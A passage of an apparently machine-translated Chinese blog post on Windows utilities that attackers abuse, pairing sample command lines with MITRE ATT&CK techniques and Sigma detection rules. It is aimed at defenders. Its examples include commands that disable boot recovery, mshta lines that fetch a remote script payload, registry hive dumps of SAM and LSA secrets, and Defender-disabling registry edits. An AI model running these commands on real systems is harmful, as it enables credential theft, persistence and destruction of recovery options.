ki kj kk mt km kn ko mu kq kr ks mv ku kv kw mw ky kz la ij bi translated">以下来自<strong class="kf ir">米特ATT &amp; CK </strong>的技术与该工具相关</p><ul class=""><li id="da19" class="nd ne iq kf b kg kh kk kl ko nf ks ng kw nh la ni nj nk nl bi translated"><a class="ae kc" href="https://attack.mitre.org/techniques/T1543/003/" rel="noopener ugc nofollow" target="_blank"> T1543.003 —创建或修改系统进程:Windows服务</a></li><li id="5c1a" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><a class="ae kc" href="https://attack.mitre.org/techniques/T1569/002/" rel="noopener ugc nofollow" target="_blank"> T1569.002 —系统服务:服务执行</a></li></ul><h2 id="7c7f" class="oa lv iq bd lw of og dn ma oh oi dp me ko oj ok mi ks ol om mm kw on oo mq op bi translated">西格玛规则</h2><p id="7e4c" class="pw-post-body-paragraph kd ke iq kf b kg ms ki kj kk mt km kn ko mu kq kr ks mv ku kv kw mw ky kz la ij bi translated">您可以使用以下sigma规则来检测该工具:</p><ul class=""><li id="dddd" class="nd ne iq kf b kg kh kk kl ko nf ks ng kw nh la ni nj nk nl bi translated">win _ using _ sc _ to _ change _ service _ image _ path _ by _ non _ admin . yml</li><li id="f45d" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated">win _ susp _ service _ path _ modification . yml</li><li id="29a0" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated">win_service_stop.yml</li><li id="c360" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated">win_new_service_creation.yml</li><li id="d671" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated">win _ multiple _ suspective _ CLI . yml</li></ul><h1 id="3820" class="lu lv iq bd lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr bi translated">BCDEdit(bcdedit.exe)</h1><blockquote class="mx my mz"><p id="bb6d" class="kd ke lt kf b kg kh ki kj kk kl km kn na kp kq kr nb kt ku kv nc kx ky kz la ij bi translated">BCDEdit是一个命令行工具，用于管理引导配置数据存储— <a class="ae kc" href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731662(v=ws.11)" rel="noopener ugc nofollow" target="_blank"> MSDN </a></p></blockquote><p id="cd10" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">通常被勒索软件用来禁用恢复功能。</p><pre class="nr ns nt nu gt nv nw nx ny aw nz bi"><span id="cfd7" class="oa lv iq nw b gy ob oc l od oe">bcdedit /set {default} recoveryenabled No</span><span id="d1b8" class="oa lv iq nw b gy oq oc l od oe">bcdedit /set {default} bootstatuspolicy ignoreallfailures</span><span id="ae47" class="oa lv iq nw b gy oq oc l od oe">bcdedit /set {current} safeboot minimal</span><span id="08a7" class="oa lv iq nw b gy oq oc l od oe">bcdedit  /f /delete {bootmgr}</span><span id="24d9" class="oa lv iq nw b gy oq oc l od oe">bcdedit /set {globalsettings} advancedoptions false</span><span id="ccbd" class="oa lv iq nw b gy oq oc l od oe">bcdedit.exe  /import "C:\Users\redacted\redacted.txt" /clean</span></pre><h2 id="56e9" class="oa lv iq bd lw of og dn ma oh oi dp me ko oj ok mi ks ol om mm kw on oo mq op bi translated">相关的斜接技术</h2><p id="5cdb" class="pw-post-body-paragraph kd ke iq kf b kg ms ki kj kk mt km kn ko mu kq kr ks mv ku kv kw mw ky kz la ij bi translated">来自CK 的<strong class="kf ir">米特ATT &amp;的以下技术与该工具相关</strong></p><ul class=""><li id="a66c" class="nd ne iq kf b kg kh kk kl ko nf ks ng kw nh la ni nj nk nl bi translated"><a class="ae kc" href="https://attack.mitre.org/techniques/T1490/" rel="noopener ugc nofollow" target="_blank"> T1490 —禁止系统恢复</a></li></ul><h2 id="6bc9" class="oa lv iq bd lw of og dn ma oh oi dp me ko oj ok mi ks ol om mm kw on oo mq op bi translated">西格玛规则</h2><p id="fae1" class="pw-post-body-paragraph kd ke iq kf b kg ms ki kj kk mt km kn ko mu kq kr ks mv ku kv kw mw ky kz la ij bi translated">您可以使用以下sigma规则来检测该工具:</p><ul class=""><li id="c4b4" class="nd ne iq kf b kg kh kk kl ko nf ks ng kw nh la ni nj nk nl bi translated"><a class="ae kc" href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_bcdedit.yml" rel="noopener ugc nofollow" target="_blank"> win_susp_bcdedit.yml </a></li></ul><h1 id="ca8d" class="lu lv iq bd lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr bi translated">姆什塔(mshta.exe)</h1><blockquote class="mx my mz"><p id="bb85" class="kd ke lt kf b kg kh ki kj kk kl km kn na kp kq kr nb kt ku kv nc kx ky kz la ij bi translated">Mshta.exe是一个执行微软HTML应用程序(HTA)文件的工具— <a class="ae kc" href="https://en.wikipedia.org/wiki/HTML_Application" rel="noopener ugc nofollow" target="_blank">维基百科</a></p></blockquote><p id="5eac" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">通常出现在感染的早期阶段，如office可执行文件或WINRAR等。但是可以被视为绕过白名单或应用控制机制。</p><pre class="nr ns nt nu gt nv nw nx ny aw nz bi"><span id="c943" class="oa lv iq nw b gy ob oc l od oe">mshta.exe [URL] /f</span><span id="3f34" class="oa lv iq nw b gy oq oc l od oe">mshta.exe ""about:&lt;hta:application&gt;&lt;script&gt;[Malicious Content]&lt;/script&gt;"</span><span id="b03e" class="oa lv iq nw b gy oq oc l od oe">mshta.exe vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))</span><span id="89f6" class="oa lv iq nw b gy oq oc l od oe">mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSBinaries/Payload/Mshta_calc.sct").Exec();close();</span></pre><h2 id="9788" class="oa lv iq bd lw of og dn ma oh oi dp me ko oj ok mi ks ol om mm kw on oo mq op bi translated">相关的斜接技术</h2><p id="acf8" class="pw-post-body-paragraph kd ke iq kf b kg ms ki kj kk mt km kn ko mu kq kr ks mv ku kv kw mw ky kz la ij bi translated">以下来自<strong class="kf ir">米特ATT &amp; CK </strong>的技术与该工具相关</p><ul class=""><li id="b098" class="nd ne iq kf b kg kh kk kl ko nf ks ng kw nh la ni nj nk nl bi translated"><a class="ae kc" href="https://attack.mitre.org/techniques/T1218/005/" rel="noopener ugc nofollow" target="_blank"> T1218.005 —签名的二进制代理执行:Mshta </a></li></ul><h2 id="c9ca" class="oa lv iq bd lw of og dn ma oh oi dp me ko oj ok mi ks ol om mm kw on oo mq op bi translated">西格玛规则</h2><p id="49fa" class="pw-post-body-paragraph kd ke iq kf b kg ms ki kj kk mt km kn ko mu kq kr ks mv ku kv kw mw ky kz la ij bi translated">您可以使用以下sigma规则来检测该工具:</p><ul class=""><li id="3dd9" class="nd ne iq kf b kg kh kk kl ko nf ks ng kw nh la ni nj nk nl bi translated"><a class="ae kc" href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_mshta_javascript.yml" rel="noopener ugc nofollow" target="_blank">win _ mshta _ JavaScript . yml</a></li><li id="79b8" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><a class="ae kc" href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_mshta_spawn_shell.yml" rel="noopener ugc nofollow" target="_blank">win _ mshta _ spawn _ shell . yml</a></li></ul><h1 id="736b" class="lu lv iq bd lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr bi translated">rundll 32(rundll32.exe)</h1><p id="4ba4" class="pw-post-body-paragraph kd ke iq kf b kg ms ki kj kk mt km kn ko mu kq kr ks mv ku kv kw mw ky kz la ij bi translated">顾名思义，“rundll32.exe”可执行文件用于“运行dll”或动态链接库。我以前在博客上写过，所以去看看吧，以便更好地理解这个工具是如何工作的。</p><div class="lb lc gp gr ld le"><a href="https://nasbench.medium.com/a-deep-dive-into-rundll32-exe-642344b41e90" rel="noopener follow" target="_blank"><div class="lf ab fo"><div class="lg ab lh cl cj li"><h2 class="bd ir gy z fp lj fr fs lk fu fw ip bi translated">深入了解RUNDLL32。可执行程序的扩展名</h2><div class="ll l"><h3 class="bd b gy z fp lj fr fs lk fu fw dk translated">了解“rundll32.exe”命令行参数</h3></div><div class="lm l"><p class="bd b dl z fp lj fr fs lk fu fw dk translated">nasbench.medium.com</p></div></div><div class="ln l"><div class="or l lp lq lr ln ls jw le"/></div></div></a></div><p id="c1ec" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">简而言之，这个工具可以用来执行恶意的动态链接库，劫持COM服务器，JavaScript，甚至远程执行共享的动态链接库。LOLBAS项目有一些很好的例子。</p><div class="lb lc gp gr ld le"><a href="https://lolbas-project.github.io/lolbas/Binaries/Rundll32/" rel="noopener  ugc nofollow" target="_blank"><div class="lf ab fo"><div class="lg ab lh cl cj li"><h2 class="bd ir gy z fp lj fr fs lk fu fw ip bi translated">rundll32 | LOLBAS</h2><div class="ll l"><h3 class="bd b gy z fp lj fr fs lk fu fw dk translated">https://evi1cg . me/archives/app locker _ Bypass _ techniques . html # menu _ index _ 7</h3></div><div class="lm l"><p class="bd b dl z fp lj fr fs lk fu fw dk translated">lolbas-project.github.io</p></div></div></div></a></div><p id="e3bf" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">在野外，你会经常看到DLL的执行，其中有问题的DLL是一个钴打击有效载荷。事情是这样的:</p><pre class="nr ns nt nu gt nv nw nx ny aw nz bi"><span id="4d26" class="oa lv iq nw b gy ob oc l od oe">rundll32 [Malicious DLL], [Exported Function]</span><span id="9a15" class="oa lv iq nw b gy oq oc l od oe">rundll32 [Malicious DLL], #[Exported Function by Ordinal]</span></pre><h2 id="d4fa" class="oa lv iq bd lw of og dn ma oh oi dp me ko oj ok mi ks ol om mm kw on oo mq op bi translated">相关的斜接技术</h2><p id="cacf" class="pw-post-body-paragraph kd ke iq kf b kg ms ki kj kk mt km kn ko mu kq kr ks mv ku kv kw mw ky kz la ij bi translated">以下来自<strong class="kf ir">米特ATT &amp; CK </strong>的技术与该工具相关</p><ul class=""><li id="86a2" class="nd ne iq kf b kg kh kk kl ko nf ks ng kw nh la ni nj nk nl bi translated"><a class="ae kc" href="https://attack.mitre.org/techniques/T1218/011/" rel="noopener ugc nofollow" target="_blank"> T1218.011 —签名的二进制代理执行:Rundll32 </a></li></ul><h2 id="c652" class="oa lv iq bd lw of og dn ma oh oi dp me ko oj ok mi ks ol om mm kw on oo mq op bi translated">西格玛规则</h2><p id="4f1a" class="pw-post-body-paragraph kd ke iq kf b kg ms ki kj kk mt km kn ko mu kq kr ks mv ku kv kw mw ky kz la ij bi translated">您可以使用以下sigma规则来检测该工具:</p><ul class=""><li id="fe93" class="nd ne iq kf b kg kh kk kl ko nf ks ng kw nh la ni nj nk nl bi translated"><a class="ae kc" href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_process_dump_rundll32_comsvcs.yml" rel="noopener ugc nofollow" target="_blank">win _ process _ dump _ rundll32 _ com SVCs . yml</a></li><li id="706a" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><a class="ae kc" href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_rundll32_activity.yml" rel="noopener ugc nofollow" target="_blank">win _ susp _ rundll32 _ activity . yml</a></li><li id="6759" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><a class="ae kc" href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_rundll32_by_ordinal.yml" rel="noopener ugc nofollow" target="_blank">win _ susp _ rundll32 _ by _ ordinal . yml</a></li><li id="3960" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><a class="ae kc" href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_wmic_proc_create_rundll32.yml" rel="noopener ugc nofollow" target="_blank">win _ susp _ wmic _ proc _ create _ rundll 32 . yml</a></li></ul><h1 id="8900" class="lu lv iq bd lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr bi translated">属性(attrib.exe)</h1><blockquote class="mx my mz"><p id="248c" class="kd ke lt kf b kg kh ki kj kk kl km kn na kp kq kr nb kt ku kv nc kx ky kz la ij bi translated">显示、设置或删除分配给文件或目录的属性— <a class="ae kc" href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/attrib" rel="noopener ugc nofollow" target="_blank"> MSDN </a></p></blockquote><p id="11ce" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">通常被恶意软件用来隐藏文件或文件夹。</p><pre class="nr ns nt nu gt nv nw nx ny aw nz bi"><span id="091e" class="oa lv iq nw b gy ob oc l od oe">attrib +h [File / Folder]</span><span id="993e" class="oa lv iq nw b gy oq oc l od oe">attrib +s +h [File / Folder]</span></pre><h2 id="041f" class="oa lv iq bd lw of og dn ma oh oi dp me ko oj ok mi ks ol om mm kw on oo mq op bi translated">西格玛规则</h2><p id="2fcb" class="pw-post-body-paragraph kd ke iq kf b kg ms ki kj kk mt km kn ko mu kq kr ks mv ku kv kw mw ky kz la ij bi translated">您可以使用以下sigma规则来检测该工具:</p><ul class=""><li id="46c6" class="nd ne iq kf b kg kh kk kl ko nf ks ng kw nh la ni nj nk nl bi translated"><a class="ae kc" href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_attrib_hiding_files.yml" rel="noopener ugc nofollow" target="_blank">win _ attrib _ hiding _ files . yml</a></li></ul><h1 id="8f0a" class="lu lv iq bd lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr bi translated">reg(reg.exe)</h1><blockquote class="mx my mz"><p id="a7c9" class="kd ke lt kf b kg kh ki kj kk kl km kn na kp kq kr nb kt ku kv nc kx ky kz la ij bi translated">Reg是一个用于与Windows注册表交互的Windows实用程序。可以在命令行界面使用它来查询、添加、修改和删除信息。— <a class="ae kc" href="https://attack.mitre.org/software/S0075/" rel="noopener ugc nofollow" target="_blank">米特ATT &amp; CK </a></p></blockquote><p id="b695" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">被攻击者用作通过添加或修改密钥在系统上持续存在的手段，用作检查是否安装了某些配置或软件的查询机制，以及用作转储凭据的机制。</p><p id="cae4" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">以下是攻击者使用该实用程序的最常见参数:</p><ul class=""><li id="d019" class="nd ne iq kf b kg kh kk kl ko nf ks ng kw nh la ni nj nk nl bi translated"><strong class="kf ir"> ADD : </strong>向注册表中添加一个新的子项或条目。</li><li id="f98b" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><strong class="kf ir">保存:</strong>在指定的文件中保存指定的注册表子项、条目和值的副本。</li><li id="1bb3" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><strong class="kf ir"> QUERY : </strong>返回位于注册表中指定子项下的下一层子项和条目的列表。</li><li id="9e18" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><strong class="kf ir">删除:</strong>从注册表中删除子项或条目。</li></ul><p id="9114" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">由于该实用程序的用法很简单(您可以在MSDN中查找)，从命令行的角度来看，有趣的是攻击者或恶意软件试图修改、转储或写入的注册表项。为此，我会简单地说谷歌一下，你会找到一篇关于它的文章。下面是一些最常见的。</p><pre class="nr ns nt nu gt nv nw nx ny aw nz bi"><span id="4d91" class="oa lv iq nw b gy ob oc l od oe">reg.exe save hklm\security [PATH]</span><span id="19e9" class="oa lv iq nw b gy oq oc l od oe">reg save hklm\system [PATH]</span><span id="5cce" class="oa lv iq nw b gy oq oc l od oe">reg save hklm\sam [PATH]</span><span id="b8de" class="oa lv iq nw b gy oq oc l od oe">reg ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "[NAME]" /t REG_SZ /F /D "[COMMAND]"</span><span id="341a" class="oa lv iq nw b gy oq oc l od oe">reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f</span><span id="4e76" class="oa lv iq nw b gy oq oc l od oe">reg  add "HKLM\System\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d "3" /f</span><span id="4ad3" class="oa lv iq nw b gy oq oc l od oe">reg save HKLM\SYSTEM\CurrentControlSet\Control\LSA\Data [Path] /y</span><span id="4d42" class="oa lv iq nw b gy oq oc l od oe">reg save HKLM\SYSTEM\CurrentControlSet\Control\LSA\GBG [Path] /y</span><span id="c84f" class="oa lv iq nw b gy oq oc l od oe">reg save HKLM\SYSTEM\CurrentControlSet\Control\LSA\Skew1 [Path] /y</span><span id="21c2" class="oa lv iq nw b gy oq oc l od oe">reg save HKLM\SYSTEM\CurrentControlSet\Control\LSA\JD [Path] /y</span></pre><p id="fb71" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">这个列表本身可以是一篇博客文章。我鼓励你看看我将在这篇博客末尾链接的参考资料，看看更多的注册表项在起作用。</p><h2 id="74f9" class="oa lv iq bd lw of og dn ma oh oi dp me ko oj ok mi ks ol om mm kw on oo mq op bi translated">相关的斜接技术</h2><p id="8736" class="pw-post-body-paragraph kd ke iq kf b kg ms ki kj kk mt km kn ko mu kq kr ks mv ku kv kw mw ky kz la ij bi translated">来自CK<strong class="kf ir">米特ATT &amp;的以下技术与该工具相关</strong></p><ul class=""><li id="a356" class="nd ne iq kf b kg kh kk kl ko nf ks ng kw nh la ni nj nk nl bi translated"><a class="ae kc" href="https://attack.mitre.org/techniques/T1112/" rel="noopener ugc nofollow" target="_blank"> T1112 —修改注册表</a></li><li id="9327" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><a class="ae kc" href="https://attack.mitre.org/techniques/T1012/" rel="noopener ugc nofollow" target="_blank"> T1012 —查询注册表</a></li><li id="8210" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><a class="ae kc" href="https://attack.mitre.org/techniques/T1552/002/" rel="noopener ugc nofollow" target="_blank"> T1552.002 —不安全的凭据:注册表中的凭据</a></li></ul><h2 id="63df" class="oa lv iq bd lw of og dn ma oh oi dp me ko oj ok mi ks ol om mm kw on oo mq op bi translated">西格玛规则</h2><p id="491e" class="pw-post-body-paragraph kd ke iq kf b kg ms ki kj kk mt km kn ko mu kq kr ks mv ku kv kw mw ky kz la ij bi translated">您可以使用以下sigma规则来检测该工具:</p><ul class=""><li id="9f9a" class="nd ne iq kf b kg kh kk kl ko nf ks ng kw nh la ni nj nk nl bi translated"><a class="ae kc" href="https://github.com/Neo23x0/sigma/blob/c56cd2dfff6343f3694ef4fd606a305415599737/rules/windows/process_creation/win_multiple_suspicious_cli.yml" rel="noopener ugc nofollow" target="_blank">win _ multiple _ suspective _ CLI . yml</a></li></ul><h1 id="2726" class="lu lv iq bd lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr bi translated">沃阿米语(whoami.exe)</h1><blockquote class="mx my mz"><p id="b56c" class="kd ke lt kf b kg kh ki kj kk kl km kn na kp kq kr nb kt ku kv nc kx ky kz la ij bi translated">显示当前登录到本地系统的用户的用户、组和权限信息— <a class="ae kc" href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/whoami" rel="noopener ugc nofollow" target="_blank"> MSDN </a></p></blockquote><p id="18cb" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">以下是恶意软件或威胁参与者最常用的标志/参数:</p><ul class=""><li id="c80b" class="nd ne iq kf b kg kh kk kl ko nf ks ng kw nh la ni nj nk nl bi translated"><strong class="kf ir"> /upn : </strong>以用户主要名称(upn)格式显示用户名。</li><li id="0eac" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><strong class="kf ir">/用户:</strong>显示当前域和用户名以及安全标识符(SID)。</li><li id="2559" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><strong class="kf ir"> /groups : </strong>显示当前用户所属的用户组。</li><li id="0281" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><strong class="kf ir"> /priv : </strong>显示当前用户的安全权限。</li><li id="18c6" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><strong class="kf ir"> /all : </strong>显示当前接入令牌中的所有信息，包括当前用户名、安全标识符(SID)、权限以及当前用户所属的组。</li></ul><pre class="nr ns nt nu gt nv nw nx ny aw nz bi"><span id="2ad9" class="oa lv iq nw b gy ob oc l od oe">whoami<br/>whoami /all<br/>whoami /groups<br/>whoami /priv<br/>whoami /user<br/>whoami /upn</span></pre><h2 id="5385" class="oa lv iq bd lw of og dn ma oh oi dp me ko oj ok mi ks ol om mm kw on oo mq op bi translated">相关的斜接技术</h2><p id="2f02" class="pw-post-body-paragraph kd ke iq kf b kg ms ki kj kk mt km kn ko mu kq kr ks mv ku kv kw mw ky kz la ij bi translated">以下来自<strong class="kf ir">米特ATT &amp; CK </strong>的技术与该工具相关</p><ul class=""><li id="b635" class="nd ne iq kf b kg kh kk kl ko nf ks ng kw nh la ni nj nk nl bi translated"><a class="ae kc" href="https://attack.mitre.org/techniques/T1033/" rel="noopener ugc nofollow" target="_blank"> T1033 —系统所有者/用户发现</a></li><li id="2f20" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><a class="ae kc" href="https://attack.mitre.org/techniques/T1059/003/" rel="noopener ugc nofollow" target="_blank"> T1059.003 —命令和脚本解释器:Windows命令外壳</a></li></ul><h2 id="91f4" class="oa lv iq bd lw of og dn ma oh oi dp me ko oj ok mi ks ol om mm kw on oo mq op bi translated">西格玛规则</h2><p id="1c16" class="pw-post-body-paragraph kd ke iq kf b kg ms ki kj kk mt km kn ko mu kq kr ks mv ku kv kw mw ky kz la ij bi translated">您可以使用以下sigma规则来检测该工具:</p><ul class=""><li id="a150" class="nd ne iq kf b kg kh kk kl ko nf ks ng kw nh la ni nj nk nl bi translated"><a class="ae kc" href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_commands_recon_activity.yml" rel="noopener ugc nofollow" target="_blank">win _ susp _ commands _ recon _ activity . yml</a></li></ul><h1 id="4677" class="lu lv iq bd lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr bi translated">系统信息(systeminfo.exe)</h1><blockquote class="mx my mz"><p id="66c8" class="kd ke lt kf b kg kh ki kj kk kl km kn na kp kq kr nb kt ku kv nc kx ky kz la ij bi translated">显示计算机及其操作系统的详细配置信息，包括操作系统配置、安全信息、产品ID和硬件属性(如RAM、磁盘空间和网卡)——<a class="ae kc" href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/systeminfo" rel="noopener ugc nofollow" target="_blank">MSDN</a></p></blockquote><p id="00c1" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">被恶意软件和威胁参与者用作发现手段。日志中最常见的形式就是“systeminfo.exe”。但是也可以使用“/s”标志远程执行。</p><pre class="nr ns nt nu gt nv nw nx ny aw nz bi"><span id="832f" class="oa lv iq nw b gy ob oc l od oe">systeminfo.exe<br/>systeminfo /s [Remote Computer]</span></pre><h2 id="53f8" class="oa lv iq bd lw of og dn ma oh oi dp me ko oj ok mi ks ol om mm kw on oo mq op bi translated">相关的斜接技术</h2><p id="95eb" class="pw-post-body-paragraph kd ke iq kf b kg ms ki kj kk mt km kn ko mu kq kr ks mv ku kv kw mw ky kz la ij bi translated">以下来自<strong class="kf ir">米特ATT &amp; CK </strong>的技术与该工具相关</p><ul class=""><li id="4ad0" class="nd ne iq kf b kg kh kk kl ko nf ks ng kw nh la ni nj nk nl bi translated"><a class="ae kc" href="https://attack.mitre.org/techniques/T1082/" rel="noopener ugc nofollow" target="_blank"> T1082 —系统信息发现</a></li></ul><h2 id="e6f7" class="oa lv iq bd lw of og dn ma oh oi dp me ko oj ok mi ks ol om mm kw on oo mq op bi translated">西格玛规则</h2><p id="54f3" class="pw-post-body-paragraph kd ke iq kf b kg ms ki kj kk mt km kn ko mu kq kr ks mv ku kv kw mw ky kz la ij bi translated">您可以使用以下sigma规则来检测该工具:</p><ul class=""><li id="6292" class="nd ne iq kf b kg kh kk kl ko nf ks ng kw nh la ni nj nk nl bi translated"><a class="ae kc" href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_commands_recon_activity.yml" rel="noopener ugc nofollow" target="_blank">win _ susp _ commands _ recon _ activity . yml</a></li></ul><h1 id="23ee" class="lu lv iq bd lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr bi translated">ARP(arp.exe)和平(ping.exe)</h1><blockquote class="mx my mz"><p id="1b5f" class="kd ke lt kf b kg kh ki kj kk kl km kn na kp kq kr nb kt ku kv nc kx ky kz la ij bi translated">ARP:显示和修改地址解析协议(ARP)缓存中的条目— MSDN</p></blockquote><p id="d28c" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">ARP命令最常用“-a”参数来显示系统上的ARP表。</p><blockquote class="mx my mz"><p id="180c" class="kd ke lt kf b kg kh ki kj kk kl km kn na kp kq kr nb kt ku kv nc kx ky kz la ij bi translated">PING:通过发送Internet控制消息协议(ICMP)回应请求消息来验证与另一台TCP/IP计算机的IP级连接——MSDN</p></blockquote><p id="83cd" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">ping命令通常用作发现机制来查看机器是否启动，或者用作执行命令之前的延迟机制。</p><p id="05bd" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">以下是恶意软件或威胁行为者执行这两种实用程序的示例:</p><pre class="nr ns nt nu gt nv nw nx ny aw nz bi"><span id="3418" class="oa lv iq nw b gy ob oc l od oe">arp -a<br/>ping -n [Number Of Pings] -4 @IP<br/>ping localhost -n 5 &amp;&amp; del [Path to executable]<br/>ping [DOMAIN CONTROLLER]<br/>ping  @IP -n 1 -w 5000<br/>ping 0x7f000001 -n 5 -w 10000</span></pre><h2 id="a4e2" class="oa lv iq bd lw of og dn ma oh oi dp me ko oj ok mi ks ol om mm kw on oo mq op bi translated">相关的斜接技术</h2><p id="c546" class="pw-post-body-paragraph kd ke iq kf b kg ms ki kj kk mt km kn ko mu kq kr ks mv ku kv kw mw ky kz la ij bi translated">以下来自<strong class="kf ir">米特ATT &amp; CK </strong>的技术与此工具相关</p><ul class=""><li id="a5a9" class="nd ne iq kf b kg kh kk kl ko nf ks ng kw nh la ni nj nk nl bi translated"><a class="ae kc" href="https://attack.mitre.org/techniques/T1016/" rel="noopener ugc nofollow" target="_blank"> T1016 —系统网络配置发现</a></li><li id="3d4d" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><a class="ae kc" href="https://attack.mitre.org/techniques/T1018/" rel="noopener ugc nofollow" target="_blank"> T1018 —远程系统发现</a></li></ul><h2 id="51d2" class="oa lv iq bd lw of og dn ma oh oi dp me ko oj ok mi ks ol om mm kw on oo mq op bi translated">西格玛规则</h2><p id="8cd5" class="pw-post-body-paragraph kd ke iq kf b kg ms ki kj kk mt km kn ko mu kq kr ks mv ku kv kw mw ky kz la ij bi translated">您可以使用以下sigma规则来检测该工具:</p><ul class=""><li id="d8be" class="nd ne iq kf b kg kh kk kl ko nf ks ng kw nh la ni nj nk nl bi translated"><a class="ae kc" href="https://web.archive.org/web/20180324153155/https://github.com/Neo23x0/sigma/blob/master/rules/windows/sysmon/sysmon_susp_ping_hex_ip.yml" rel="noopener ugc nofollow" target="_blank">sysmon _ susp _ ping _ hex _ IP . yml</a></li></ul><h1 id="fac0" class="lu lv iq bd lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr bi translated">taskkill(taskkill.exe)</h1><blockquote class="mx my mz"><p id="9a25" class="kd ke lt kf b kg kh ki kj kk kl km kn na kp kq kr nb kt ku kv nc kx ky kz la ij bi translated">结束一个或多个任务或进程。进程可以通过进程ID或映像名称结束— <a class="ae kc" href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/taskkill" rel="noopener ugc nofollow" target="_blank"> MSDN </a></p></blockquote><p id="de74" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">顾名思义，这个实用程序用于终止正在运行的进程。通常被恶意软件或威胁者用来确保备份软件或反病毒软件等其他进程不会干扰他们的工作。</p><p 